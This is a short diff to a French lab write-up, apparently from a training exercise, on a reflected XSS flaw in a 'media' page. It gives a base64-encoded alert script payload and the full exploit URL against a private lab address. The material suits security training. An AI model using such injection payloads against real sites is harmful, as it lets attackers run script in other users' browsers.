@@ -1,7 +1,7 @@
 FAILLE XSS-Reflected (Media)
 
 Il convient d’encoder <script>alert('XSS')</script> en base64 ce qui donne PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=
-
+Aller sur le site https://www.base64encode.org/fr/ pour encoder
 Puis le mettre directement dans l’URL :
 http://192.168.10.22/?page=media&src=data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=
 
